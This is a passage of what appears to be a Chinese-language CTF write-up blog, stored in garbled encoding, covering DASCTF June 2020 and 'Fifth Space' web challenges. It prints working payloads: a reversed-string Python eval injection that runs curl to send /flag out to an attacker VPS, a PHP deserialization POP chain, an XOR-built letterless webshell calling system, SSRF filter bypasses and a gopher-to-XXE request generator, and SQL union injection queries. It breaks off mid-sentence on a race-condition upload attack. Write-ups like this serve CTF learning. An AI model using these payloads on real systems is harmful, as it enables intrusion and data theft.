debug=False)\rå¯ä»¥çœ‹åˆ°ï¼Œ31è¡Œé‚£é‡ŒæŠŠæˆ‘ä»¬çš„ç»“æœå’Œä¸€ä¸ªè¡¨è¾¾å¼è¿›è¡Œç®€å•çš„å­—ç¬¦ä¸²æ‹¼æ¥ä¹‹åevalç›´æ¥æ‰§è¡Œï¼Œè¿™å°±ç»™äº†æˆ‘ä»¬å‘½ä»¤æ³¨å…¥çš„æœºä¼šï¼›\næˆ‘ä»¬æ¥æœ¬åœ°è¯•ä¸€ä¸‹ï¼š\n#python3\rimport os\rinput_question = '100000='\rinput = \u0026quot;1,os.system(\\'dir\\')\u0026quot;\rcalc_result = str((eval(input_question + \u0026quot;=\u0026quot; + str(input))))\rprint(calc_result)\ræˆ‘ä»¬å‘ç°dirå‘½ä»¤ç¡®å®è¢«æ‰§è¡Œäº†ï¼Œä½†æ˜¯é¢˜ç›®æ²¡æœ‰å›æ˜¾ï¼Œæˆ‘ä»¬å°±åªèƒ½ç”¨å…¶ä»–æ–¹å¼å¤–å¸¦åˆ°æˆ‘ä»¬çš„VPSä¸Šé¢å»\né‚£ä¹ˆå‰©ä¸‹çš„å°±åªæœ‰ç»•wafäº†\nfuzzäº†ä¸€ä¸‹ï¼Œsysï¼Œimportï¼Œosè¿™äº›å…³é”®è¯è¿‡æ»¤äº†ï¼Œä½†æ˜¯execè¿™äº›æ²¡æœ‰è¢«è¿‡æ»¤\nå¯ä»¥è€ƒè™‘å­—ç¬¦ä¸²æ‹¼æ¥æˆ–è€…é€†è¯»ç»•è¿‡ï¼Œè¿™é‡Œç”¨çš„æ˜¯é€†è¯»ï¼š\nimport os\rstr = '''os.popen(\u0026quot;curl ip:ç«¯å£/?a=`cat /flag|base64`\u0026quot;).read()'''#å› ä¸ºsyså€’è¿‡æ¥ä¹Ÿæ˜¯sysï¼Œæ‰€ä»¥æ¢æˆpopen\rprint(str[::-1])\r#exec(')(daer.)\u0026quot;`46esab|galf/ tac`=a?/0058:4.751.011.95 lruc\u0026quot;(nepop.so'[::-1])\rå‘é€payloadï¼Œç›‘å¬VPSç›¸åº”ç«¯å£ï¼Œå¾—åˆ°flagï¼›\nç®€å•çš„è®¡ç®—å™¨-2 è€ƒç‚¹ï¼šï¼Ÿï¼Ÿï¼Ÿ\nçœ‹äº†ä¸‹æºç ï¼š\n#!/usr/bin/env python3\r# -*- coding: utf-8 -*-\rfrom flask import Flask, render_template, request,session\rfrom config import black_list,create\rimport os\rapp = Flask(__name__)\rapp.config['SECRET_KEY'] = os.urandom(24)\r## flag is in /flag try to get it\r@app.route('/', methods=['GET', 'POST'])\rdef index():\rdef filter(string):\rfor black_word in black_list:\rif black_word in string:\rreturn \u0026quot;hack\u0026quot;\rreturn string\rif request.method == 'POST':\rinput = request.form['input']\rcreate_question = create()\rinput_question = session.get('question')\rsession['question'] = create_question\rif input_question == None:\rreturn render_template('index.html', answer=\u0026quot;Invalid session please try again!\u0026quot;, question=create_question)\rif filter(input)==\u0026quot;hack\u0026quot;:\rreturn render_template('index.html', answer=\u0026quot;hack\u0026quot;, question=create_question)\rcalc_str = input_question + \u0026quot;=\u0026quot; + str(input)\rtry:\rcalc_result = str((eval(calc_str)))\rexcept Exception as ex:\rcalc_result = \u0026quot;Invalid\u0026quot;\rreturn render_template('index.html', answer=calc_result,question=create_question)\rif request.method == 'GET':\rcreate_question = create()\rsession['question'] = create_question\rreturn render_template('index.html',question=create_question)\r@app.route('/source')\rdef source():\rreturn open(\u0026quot;app.py\u0026quot;, \u0026quot;r\u0026quot;).read()\rif __name__ == '__main__':\rapp.run(host=\u0026quot;0.0.0.0\u0026quot;, debug=False)\rå¤§åŒå°å¼‚ï¼›\nç”¨ä¸Šä¸€é“é¢˜çš„payloadç›´æ¥ç§’äº†â€¦â€¦å•Šâ€¦â€¦è¿™â€¦â€¦\nå¯èƒ½æœ¬æ¥ä¸Šä¸€é“é¢˜çš„ä¸éœ€è¦ç»•wafï¼Œä½†æ˜¯åæ¥æš—æ”¹äº†ä¹‹åæ”¹æˆä¸€é“é¢˜äº†ã€‚ã€‚ã€‚\nåæ¥å’Œå­¦é•¿äº¤æµï¼Œè¯´æ˜¯å¯ä»¥ç”¨æ²™ç®±é€ƒé€¸æ¥åšï¼Œå¯èƒ½æ²™ç®±é€ƒé€¸æ‰æ˜¯æƒ³è€ƒçš„ã€‚\nphpuns è€ƒç‚¹ï¼šååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œpopé“¾ï¼Œ16è¿›åˆ¶ç»•è¿‡å…³é”®å­—\nç›´æ¥ç»™äº†æºç çš„é™„ä»¶ï¼šDASCTF_2020.6_ååºåˆ—åŒ–_source\nå…ˆæ„é€ popé“¾ï¼›\nPOPé“¾åˆ©ç”¨ å¾ˆæ˜æ˜¾class.phpé‡Œé¢çš„ç±»æ˜¯ç»™æˆ‘ä»¬åˆ©ç”¨çš„ï¼Œæ„é€ å¾ˆç®€å•ï¼š\n$pop = new Hacker_A;\r$pop-\u0026gt;c2e38 = new Hacker_B;\r$pop-\u0026gt;c2e38-\u0026gt;c2e38 = new Hacker_C;\rç”Ÿæˆäº†ï¼š\nO:8:\u0026quot;Hacker_A\u0026quot;:1:{s:5:\u0026quot;c2e38\u0026quot;;O:8:\u0026quot;Hacker_B\u0026quot;:1:{s:5:\u0026quot;c2e38\u0026quot;;O:8:\u0026quot;Hacker_C\u0026quot;:1:{s:4:\u0026quot;name\u0026quot;;s:4:\u0026quot;test\u0026quot;;}}}\r#ä¸€å…±103ä¸ªå­—ç¬¦\rååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°index.phpç¬¬29è¡Œè°ƒç”¨äº†addå‡½æ•°ï¼š\n$_SESSION['info'] = add(serialize($user));\rç„¶åinfo.phpç¬¬6è¡Œè°ƒç”¨äº†reduceå‡½æ•°ï¼š\n$tmp = unserialize(reduce($_SESSION['info']));\ræˆ‘ä»¬å»çœ‹functions.phpé‡Œé¢è¿™ä¸¤ä¸ªå‡½æ•°çš„å®šä¹‰ï¼š\nfunction add($data)\r{\r$data = str_replace(chr(0).'*'.chr(0), '\\0*\\0', $data);\rreturn $data;\r}\rfunction reduce($data)\r{\r$data = str_replace('\\0*\\0', chr(0).'*'.chr(0), $data);\rreturn $data;\r}\rchr(0).'*'.chr(0) ä¹Ÿå°±æ˜¯ N*N ï¼ˆNè¡¨ç¤ºnullï¼‰å ä¸‰ä¸ªå­—ç¬¦ï¼Œè€Œ \\0*\\0 å äº”ä¸ªå­—ç¬¦ï¼Œå½“æˆ‘ä»¬çš„ \\0*\\0 è¢«æ›¿æ¢ä¸º N*N ä¹‹åå°±å°‘äº†ä¸¤ä¸ªå­—ç¬¦ï¼Œäºæ˜¯æˆ‘ä»¬å°±èƒ½åœ¨ååºåˆ—åŒ–ä¸­åæ‰åé¢ä¸¤ä¸ªå­—ç¬¦ï¼›ï¼ˆå‚è€ƒæœ¬ç«™ï¼šå®‰æ’4æœˆèµ›ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼‰\nå¦‚æœæˆ‘ä»¬ç›´æ¥æŠŠpopé“¾æ„é€ çš„ç»“æœä¼ ç»™passwordçš„è¯ï¼Œåºåˆ—åŒ–çš„ç»“æœæ˜¯è¿™æ ·ï¼š\ns:8:\u0026quot;username\u0026quot;;s:5:\u0026quot;input\u0026quot;;s:8:\u0026quot;password\u0026quot;;s:103:\u0026quot;O:8:\u0026quot;Hacker_A\u0026quot;:1:{s:5:\u0026quot;c2e38\u0026quot;;O:8:\u0026quot;Hacker_B\u0026quot;:1:{s:5:\u0026quot;c2e38\u0026quot;;O:8:\u0026quot;Hacker_C\u0026quot;:1:{s:4:\u0026quot;name\u0026quot;;s:4:\u0026quot;test\u0026quot;;}}}\u0026quot;\ræˆ‘ä»¬è¿™103ä¸ªå­—ç¬¦è¢«å› ä¸ºs:103è¢«å½“ä½œå­—ç¬¦ä¸²å¤„ç†ï¼Œäºæ˜¯æˆ‘ä»¬åˆ©ç”¨åå­—ç¬¦ï¼ŒæŠŠ \u0026quot;;s:8:\u0026quot;password\u0026quot;;s:103:\u0026quot; ï¼ˆ24ä¸ªå­—ç¬¦ï¼Œ12ç»„ \\0*\\0 ï¼‰è¿™ä¸€æ®µåæ‰ï¼Œç„¶åæŠŠä¸‹é¢çš„ä¼ ç»™passwordï¼š\n\u0026quot;;s:8:\u0026quot;password\u0026quot;;O:8:\u0026quot;Hacker_A\u0026quot;:1:{s:5:\u0026quot;c2e38\u0026quot;;O:8:\u0026quot;Hacker_B\u0026quot;:1:{s:5:\u0026quot;c2e38\u0026quot;;O:8:\u0026quot;Hacker_C\u0026quot;:1:{s:4:\u0026quot;name\u0026quot;;s:4:\u0026quot;test\u0026quot;;}}}\ré‚£ä¹ˆæˆ‘ä»¬å°±æˆåŠŸçš„å°±è¡Œäº†é€ƒé€¸ï¼›\nä¸è¿‡ï¼Œåœ¨ååºåˆ—åŒ–ä¹‹å‰ï¼Œinfo.phpé‡Œé¢ç¬¬5è¡Œæœ‰ï¼š check(reduce($_SESSION['info']));\ncheckå‡½æ•°ä¼šæ£€æŸ¥æˆ‘ä»¬çš„å­—ç¬¦é‡Œé¢æ˜¯å¦æœ‰ c2e38 ï¼Œæ‰€ä»¥ç”¨S:5:\u0026quot;\\63\\32\\65\\33\\38\u0026quot;æ¥ç»•è¿‡ï¼Œå’Œç”¨S+\\00æ¥ç»•è¿‡chr(0)æ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºSå¤§å†™ï¼Œåé¢å­—ç¬¦ä¸²é‡Œå°±å¯ä»¥è§£æhexäº†\n","date":"2020-06-27T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/dasctf2020.6%E6%9C%88%E8%B5%9B/","title":"DASCTF2020.6æœˆèµ›"},{"content":"hate-php è€ƒç‚¹ï¼šå¼‚æˆ–å–åæ„é€ æ— å­—æ¯æ•°å­—webshell\nå¼€é¢˜é€ç ï¼š\n\u0026lt;?php\rerror_reporting(0);\rif(!isset($_GET['code'])){\rhighlight_file(__FILE__);\r}else{\r$code = $_GET['code'];\rif (preg_match('/(f|l|a|g|\\.|p|h|\\/|;|\\\u0026quot;|\\'|\\`|\\||\\[|\\]|\\_|=)/i',$code)) { die('You are too good for me'); }\r$blacklist = get_defined_functions()['internal'];\rforeach ($blacklist as $blackitem) { if (preg_match ('/' . $blackitem . '/im', $code)) { die('You deserve better'); } }\rassert($code);\r}\rpreg_match banæ‰äº†ä¸‹åˆ’çº¿ç­‰å­—ç¬¦ï¼Œç„¶å get_defined_functions()['internal'] ç¦ç”¨äº†å†…ç½®å‡½æ•°\nä½†æ˜¯æ²¡æœ‰è¿‡æ»¤å–å~å’Œå¼‚æˆ–^ï¼Œ\nPHP7å‰æ˜¯ä¸å…è®¸ç”¨($a)();è¿™æ ·çš„æ–¹æ³•æ¥æ‰§è¡ŒåŠ¨æ€å‡½æ•°çš„ï¼Œä½†PHP7ä¸­å¢åŠ äº†å¯¹æ­¤çš„æ”¯æŒã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ ('phpinfo')(); æ¥æ‰§è¡Œå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªæ‹¬å·ä¸­å¯ä»¥æ˜¯ä»»æ„PHPè¡¨è¾¾å¼ã€‚\nä¸ä½†å¦‚æ­¤ï¼Œè¿™ä¸ªpayloadè¿˜æ”¯æŒæ¥å—å‚æ•°ï¼Œæ¯”å¦‚ ('phpinfo')(1) ï¼Œè¿™é“é¢˜è¿‡æ»¤äº†åˆ†å·ï¼Œä½†æ˜¯è¿™é“é¢˜ä¸éœ€è¦åˆ†å·ä¹Ÿå¯ä»¥æ‰§è¡Œ\né‚£ä¹ˆæˆ‘ä»¬è‡ªç„¶å¯ä»¥ç”¨è¿™ä¸ªæ¥æ‰§è¡Œä¸€äº›ä»£ç ï¼›\n?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();\u0026amp;%ff=phpinfo\ræˆåŠŸè¿”å›äº† phpinfo ï¼Œæˆ‘ä»¬ç»§ç»­æ„é€ ä¸€ä¸ªshellï¼š\n?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ee}(${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff})\u0026amp;%ee=system\u0026amp;%ff=ls\rå¯ä»¥çœ‹åˆ°lsçš„ç»“æœï¼Œä¸è¿‡catå¥½åƒåˆè¢«å®°æ‰äº†ï¼Œç”¨ tac fl* æ¥è·å–flag\ndo you know é¢„æœŸï¼šgopheråè®®SSRFæ‰“XXEï¼ŒURLç¼–ç æ˜¾ç¤ºç©ºå­—ç¬¦ï¼Œpopé“¾\néé¢„æœŸï¼šç›´æ¥URLç¼–ç å­—æ¯æ¥ç»•è¿‡fileå…³é”®å­—è¯»å–flag\nå‘~è¿™é“é¢˜æ˜¯æ°”æ­»å•Šï¼Œæˆ‘ç”¨gopheråè®®è¯»å–äº†main.phpä¹‹åé‡åˆ°äº†ä¸€ä¸ªè°œä¹‹popé“¾ï¼Œæœ€åé¥®æ¨äºæ­¤ï¼Œåæ¥çœ‹äº†ä¸€äº›å¸ˆå‚…çš„wpä¹‹åï¼ŒçŸ¥é“è¿™ä¸ªéé¢„æœŸç›´æ¥åè¡€ã€‚ã€‚ã€‚è¿™æ³¢å•Šâ€¦â€¦è¿™æ³¢æ˜¯æ°”æ­»â€¦â€¦\né¢˜ç›®åˆ†æ ä¸€æ¥å°±ç»™å‡ºæºç ï¼š\n \u0026lt;?php\rhighlight_file(__FILE__);\r#æœ¬é¢˜æ— æ³•è®¿é—®å¤–ç½‘\r#è¿™é¢˜çœŸæ²¡æœ‰å…¶ä»–æ–‡ä»¶ï¼Œè¯·ä¸è¦å†å¼€ç›®å½•æ‰«æå™¨äº†ï¼Œæœ‰çš„æ–‡ä»¶æˆ‘éƒ½åœ¨æ³¨é‡Šé‡Œé¢å‘Šè¯‰ä½ ä»¬äº†\r#å„ä½å¤§ä½¬...è¿™é¢˜éƒ½æ²¡æœ‰æ•°æ®åº“çš„å­˜åœ¨...éº»çƒ¦ä¸è¦ç”¨å·¥å…·æ‰«æˆ‘äº†å¥½ä¸å¥½\r#there is xxe.php\r$poc=$_SERVER['QUERY_STRING'];\rif(preg_match(\u0026quot;/log|flag|hist|dict|etc|file|write/i\u0026quot; ,$poc)){\rdie(\u0026quot;no hacker\u0026quot;);\r}\r$ids=explode('\u0026amp;',$poc);\r$a_key=explode('=',$ids[0])[0];\r$b_key=explode('=',$ids[1])[0];\r$a_value=explode('=',$ids[0])[1];\r$b_value=explode('=',$ids[1])[1];\rif(!$a_key||!$b_key||!$a_value||!$b_value)\r{\rdie('æˆ‘ä»€ä¹ˆéƒ½æ²¡æœ‰~');\r}\rif($a_key==$b_key)\r{\rdie(\u0026quot;trick\u0026quot;);\r}\rif($a_value!==$b_value)\r{\rif(count($_GET)!=1)\r{\rdie('be it so');\r}\r}\rforeach($_GET as $key=\u0026gt;$value)\r{\r$url=$value;\r}\r$ch = curl_init();\rif ($type != 'file') {\r#add_debug_log($param, 'post_data');\r// è®¾ç½®è¶…æ—¶\rcurl_setopt($ch, CURLOPT_TIMEOUT, 30);\r} else {\r// è®¾ç½®è¶…æ—¶\rcurl_setopt($ch, CURLOPT_TIMEOUT, 180);\r}\rcurl_setopt($ch, CURLOPT_URL, $url);\rcurl_setopt($ch, CURLOPT_POST, true);\rcurl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);\rcurl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\r// è®¾ç½®header\rif ($type == 'file') {\r$header[] = \u0026quot;content-type: multipart/form-data; charset=UTF-8\u0026quot;;\rcurl_setopt($ch, CURLOPT_HTTPHEADER, $header);\r} elseif ($type == 'xml') {\rcurl_setopt($ch, CURLOPT_HEADER, false);\r} elseif ($has_json) {\r$header[] = \u0026quot;content-type: application/json; charset=UTF-8\u0026quot;;\rcurl_setopt($ch, CURLOPT_HTTPHEADER, $header);\r}\r// curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)');\rcurl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\rcurl_setopt($ch, CURLOPT_AUTOREFERER, 1);\r// dump($param);\rcurl_setopt($ch, CURLOPT_POSTFIELDS, $param);\r// è¦æ±‚ç»“æœä¸ºå­—ç¬¦ä¸²ä¸”è¾“å‡ºåˆ°å±å¹•ä¸Š\rcurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\r// ä½¿ç”¨è¯ä¹¦ï¼šcert ä¸ key åˆ†åˆ«å±äºä¸¤ä¸ª.pemæ–‡ä»¶\r$res = curl_exec($ch);\rvar_dump($res);\ræ˜æ˜¾æ˜¯æ»¥ç”¨ curl_exec å¯¼è‡´SSRFï¼Œç¬¬11-36è¡Œå†™çš„å¾ˆåƒµç¡¬ï¼Œæ„æ€æ˜¯GETä¼ å…¥çš„ç¬¬ä¸€ç¬¬äºŒä¸ªå‚æ•°å¿…é¡»é”®åä¸åŒé”®å€¼ç›¸åŒï¼Œ\nç„¶å foreach é‡Œé¢åˆæŠŠæœ€åä¸€ä¸ªå€¼èµ‹ç»™äº† $url\næ‰€ä»¥æˆ‘ä»¬ç›´æ¥ ?a=xxx\u0026amp;b=xxx\u0026amp;c=payload å°±è¡Œï¼Œäºæ˜¯æˆ‘ä»¬ä¼ å…¥ ?a=xxx\u0026amp;b=xxx\u0026amp;c=127.0.0.1 å°±çœ‹åˆ°äº†è¯·æ±‚index.phpçš„ç»“æœ\né‚£ä¹ˆå…ˆè¯´éé¢„æœŸï¼š\nurlencodeç¼–ç ç»•è¿‡fileå…³é”®å­— ä»–æ­£åˆ™åŒ¹é…çš„æ˜¯$_SERVER[\u0026ldquo;QUERY_STRING\u0026rdquo;];\n$poc=$_SERVER['QUERY_STRING']; if(preg_match(\u0026quot;/log|flag|hist|dict|etc|file|write/i\u0026quot; ,$poc)){\rdie(\u0026quot;no hacker\u0026quot;); }\rä½†æ˜¯èµ‹å€¼ç»™urlçš„æ—¶å€™æ˜¯$_GET\nforeach($_GET as $key=\u0026gt;$value) {\r$url=$value; }\rè°œåº•æ­æ™“ï¼š\nåŸç†æ˜¯$_SERVER[\u0026ldquo;QUERY_STRING\u0026rdquo;]å’Œ$_GETä¸¤ä¸ªè¶…å…¨å±€å˜é‡å‚¨å­˜æ•°æ®æ–¹å¼ä¸åŒï¼Œå¹¶ä¸æ˜¯ä¸€äº›å¸ˆå‚…è¯´çš„äºŒæ¬¡è§£ç çš„é—®é¢˜\næ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬æƒ³è¦ç”¨ file://var/www/html/flag.php æ¥è¯»å–flagçš„è¯ï¼Œä»–çš„filteræ˜¯ä¼šè¿‡æ»¤æˆ‘ä»¬ï¼›\nä½†æ˜¯æˆ‘ä»¬åªè¦æŠŠè¿™å¥payloadURLç¼–ç ï¼ˆè‹±æ–‡å­—æ¯ä¹Ÿå¯ä»¥URLç¼–ç ï¼Œæ ¼å¼ä¸º%+å­—ç¬¦çš„16è¿›åˆ¶ï¼Œè¯¦è§èœé¸Ÿæ•™ç¨‹ï¼‰\npayloadï¼š\n?a=xxx\u0026amp;b=xxx\u0026amp;c=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70\ræŸ¥çœ‹æºç å°±æœ‰flagï¼›\nè¯´åˆ°è¿™é‡Œï¼Œå…¶å®ä¹Ÿä¸ç®—éé¢„æœŸäº†ï¼›\ngopheråè®®SSRFåˆ©ç”¨XXEè¯»å–flag.php è¿™ä¸ªæ–¹æ³•æ¯”è¾ƒéº»çƒ¦ä¸€ç‚¹ï¼Œè€Œä¸”è¿˜å¯èƒ½ä¼šèµ°åï¼ˆèµ°åé€‰æ‰‹å·²ç»å“­æ™•åœ¨å•æ‰€ï¼‰\nç”ŸæˆPOSTæ•°æ®æµçš„expï¼š\n#python3\r#wh1sper\rfrom urllib.parse import quote\rstream = \u0026quot;\u0026quot;\u0026quot;POST /xxe.php HTTP/1.1\rHost: 121.36.64.91\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 225\rUpgrade-Insecure-Requests: 1\rdata=%3C%3Fxml%20version%20%3D%20%221.0%22%3F%3E%0A%3C!DOCTYPE%20ANY%20%5B%0A%20%20%20%20%3C!ENTITY%20f%20SYSTEM%20%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dhints.php%22%3E%0A%5D%3E%0A%3Cx%3E%26f%3B%3C%2Fx%3E\r\u0026quot;\u0026quot;\u0026quot;.replace(\u0026quot;\\n\u0026quot;, \u0026quot;\\r\\n\u0026quot;)#dataéœ€è¦å…ˆURLç¼–ç ä¸€æ¬¡\rprint(quote(stream))\rç”Ÿæˆï¼š\nPOST%20/xxe.php%20HTTP/1.1%0D%0AHost%3A%20121.36.64.91%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%20225%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0A%0D%0Adata%3D%253C%253Fxml%2520version%2520%253D%2520%25221.0%2522%253F%253E%250A%253C%21DOCTYPE%2520ANY%2520%255B%250A%2520%2520%2520%2520%253C%21ENTITY%2520f%2520SYSTEM%2520%2522php%253A%252F%252Ffilter%252Fconvert.base64-encode%252Fresource%253D%252566%25256c%252561%252567.%252570%252568%252570%2522%253E%250A%255D%253E%250A%253Cx%253E%2526f%253B%253C%252Fx%253E%0D%0A\ræ‹¿å»URLencodeä¹‹åï¼Œç”¨gopheråè®®æ‰“ï¼ˆgopheråè®®åé¢çš„æ•°æ®éœ€è¦äºŒæ¬¡ç¼–ç ï¼‰ï¼š\n?a=xxx\u0026amp;b=xxx\u0026amp;c=gopher%3a%2f%2f127.0.0.1%3a80%2f_POST%2520%2fxxe.php%2520HTTP%2f1.1%250D%250AHost%253A%2520121.36.64.91%250D%250AContent-Type%253A%2520application%2fx-www-form-urlencoded%250D%250AContent-Length%253A%2520238%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250Adata%253D%25253C%25253Fxml%252520version%252520%25253D%252520%2525221.0%252522%25253F%25253E%25250A%25253C%2521DOCTYPE%252520ANY%252520%25255B%25250A%252520%252520%252520%252520%25253C%2521ENTITY%252520f%252520SYSTEM%252520%252522php%25253A%25252F%25252Ffilter%25252Fconvert.base64-encode%25252Fresource%25253D%252566%25256c%252561%252567.%252570%252568%252570%252522%25253E%25250A%25255D%25253E%25250A%25253Cx%25253E%252526f%25253B%25253C%25252Fx%25253E%250D%250A\rä¸Šé¢è¿™ä¸ªpayloadæ˜¯xxeç›´æ¥flag.phpï¼Œä½†æ˜¯æ²¡åŒå†™æ‰€ä»¥è¯»ä¸åˆ°ï¼Œç„¶åflagå…³é”®å­—è¿˜æ˜¯éœ€è¦URLencodeï¼Œå…¶å®ä¹Ÿå°±ç›¸å½“äºåˆ©ç”¨äº†è¶…å…¨å±€å˜é‡ï¼Œå’Œå¦å¤–ä¸€ä¸ªæ–¹æ³•æ¯”èµ·æ¥ç®€ç›´å¼±çˆ†äº†\næ³¨æ„\n1.ä¿®æ”¹æ•°æ®æ—¶è®°å¾—æ”¹POSTè¯·æ±‚å¤´çš„Content-Typeï¼›\n2.è®°å¾—åŒå†™ï¼Œxxe.phpçš„è¿‡æ»¤æ˜¯æ›¿æ¢ä¸ºç©º\n3.ä¸‡ä¸‡ä¸è¦è¯»å–hints.phpå’Œmain.phpï¼Œæœ€åä¼šèµ°åˆ°ä¸€ä¸ªåšä¸å‡ºæ¥çš„popé“¾\nå¤ç°åˆ°è¿™é‡Œï¼Œå†æ¬¡å“­æ™•ï¼›\n","date":"2020-06-26T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","title":"â€œç¬¬äº”ç©ºé—´â€æ™ºèƒ½å®‰å…¨å¤§èµ›"},{"content":" easyweb æºç å¿˜äº†è„±ä¸‹æ¥ï¼Œå¤§æ¦‚è€ƒå¯ŸPHP strcmp()å‡½æ•°ï¼Œç›´æ¥æ•°ç»„ç»•è¿‡\n?password[]=shit\ræˆç»©å• ç™½ç»™é¢˜ï¼ŒUnionæ³¨å…¥æ— ä»»ä½•è¿‡æ»¤ï¼Œä¸Šæ¥ç›´æ¥ä¸€è¡€\nid=-1' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#\r//fl4g,sc\rid=-1' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='fl4g'#\r//flag\rid=-1' union select 1,flag,3,4 from fl4g#\r//flag{Sql_INJECT0N_4813drd8hz4}\rshop è€ƒç‚¹ï¼šæ¡ä»¶ç«äº‰\nè¯´å®è¯ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯é€»è¾‘æ¼æ´ï¼Œå°è¯•äº†åŠå¤©æ²¡æå‡ºæ¥ï¼Œæƒ³åˆ°äº†æ¡ä»¶ç«äº‰ä½†æ˜¯å› ä¸ºçˆ†ç ´çš„æ—¶å€™çº¿ç¨‹è®¾ç½®çš„ä¸å¤Ÿé«˜ï¼Œæ‰€ä»¥æ²¡æå‡ºæ¥ï¼Œæ—¶å€™æ¥åˆå°è¯•äº†ä¸€æ¬¡æ‰æƒ³åˆ°ã€‚\nä»€ä¹ˆæ˜¯æ¡ä»¶ç«äº‰ å‚è€ƒï¼šhttps://www.jianshu.com/p/09d0eb938e6a\nç«äº‰æ¡ä»¶å‘ç”Ÿåœ¨å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®åŒä¸€ä¸ªå…±äº«ä»£ç ã€å˜é‡ã€æ–‡ä»¶ç­‰æ²¡æœ‰è¿›è¡Œé”æ“ä½œæˆ–è€…åŒæ­¥æ“ä½œçš„åœºæ™¯ä¸­ã€‚\nå¼€å‘è€…åœ¨è¿›è¡Œä»£ç å¼€å‘æ—¶å¸¸å¸¸å€¾å‘äºè®¤ä¸ºä»£ç ä¼šä»¥çº¿æ€§çš„æ–¹å¼æ‰§è¡Œï¼Œè€Œä¸”ä»–ä»¬å¿½è§†äº†å¹¶è¡ŒæœåŠ¡å™¨ä¼šå¹¶å‘æ‰§è¡Œå¤šä¸ªçº¿ç¨‹ï¼Œè¿™å°±ä¼šå¯¼è‡´æ„æƒ³ä¸åˆ°çš„ç»“æœã€‚\nçº¿ç¨‹åŒæ­¥æœºåˆ¶ç¡®ä¿ä¸¤ä¸ªåŠä»¥ä¸Šçš„å¹¶å‘è¿›ç¨‹æˆ–çº¿ç¨‹ä¸åŒæ—¶æ‰§è¡ŒæŸäº›ç‰¹å®šçš„ç¨‹åºæ®µï¼Œä¹Ÿè¢«ç§°ä¹‹ä¸ºä¸´ç•ŒåŒºï¼ˆcritical sectionï¼‰ï¼Œå¦‚æœæ²¡æœ‰åº”ç”¨å¥½åŒæ­¥æŠ€æœ¯åˆ™ä¼šå‘ç”Ÿâ€œç«äº‰æ¡ä»¶â€é—®é¢˜ã€‚\nä¸¤ä¸ªä¾‹å­ ä¾‹1ï¼šé‡‘é¢æç° å‡è®¾ç°æœ‰ä¸€ä¸ªç”¨æˆ·åœ¨ç³»ç»Ÿä¸­å…±æœ‰2000å…ƒå¯ä»¥æç°ï¼Œä»–æƒ³å…¨éƒ¨æç°ã€‚äºæ˜¯è¯¥ç”¨æˆ·åŒæ—¶å‘èµ·ä¸¤æ¬¡æç°è¯·æ±‚ï¼Œç¬¬ä¸€æ¬¡æäº¤è¯·æ±‚æç°2000å…ƒï¼Œç³»ç»Ÿå·²ç»åˆ›å»ºäº†æç°è®¢å•ä½†è¿˜æœªæ¥å¾—åŠä¿®æ”¹è¯¥ç”¨æˆ·å‰©ä½™é‡‘é¢ï¼Œæ­¤æ—¶ç¬¬äºŒæ¬¡æç°è¯·æ±‚åŒæ ·æ˜¯æç°2000å…ƒï¼Œäºæ˜¯ç¨‹åºåœ¨è¿˜æœªä¿®æ”¹å®Œä¸Šä¸€æ¬¡è¯·æ±‚åçš„ä½™é¢å‰å°±è¿›è¡Œäº†ä½™é¢åˆ¤æ–­ï¼Œæ˜¾ç„¶å¦‚æœè¿™é‡Œä½™é¢åˆ¤æ–­é€Ÿåº¦å¿«äºä¸Šä¸€æ¬¡ä½™é¢ä¿®æ”¹é€Ÿåº¦ï¼Œå°†ä¼šäº§ç”ŸæˆåŠŸæç°çš„ä¸¤æ¬¡è®¢å•ï¼Œè€Œæ•°æ®åº“ä¸­ä½™é¢ä¹Ÿå°†å˜ä¸º-2000ã€‚è€Œè¿™äº§ç”Ÿçš„åæœå°†ä¼šæ˜¯å¹³å°å¤šå‘è¯¥ç”¨æˆ·ä»˜å‡º2000å…ƒã€‚\nä¾‹2ï¼šå…ˆå­˜å‚¨æ–‡ä»¶ï¼Œå†åˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œç„¶åå†åˆ é™¤ã€‚ é¦–å…ˆå°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶åæ£€æµ‹æ–‡ä»¶åç¼€åï¼Œå¦‚æœä¸ç¬¦åˆæ¡ä»¶ï¼Œå°±åˆ æ‰ï¼Œå…¸å‹çš„â€œå¼•ç‹¼å…¥å®¤â€\næ”»å‡»ï¼šé¦–å…ˆä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶\nå½“ç„¶è¿™ä¸ªæ–‡ä»¶ä¼šè¢«ç«‹é©¬åˆ 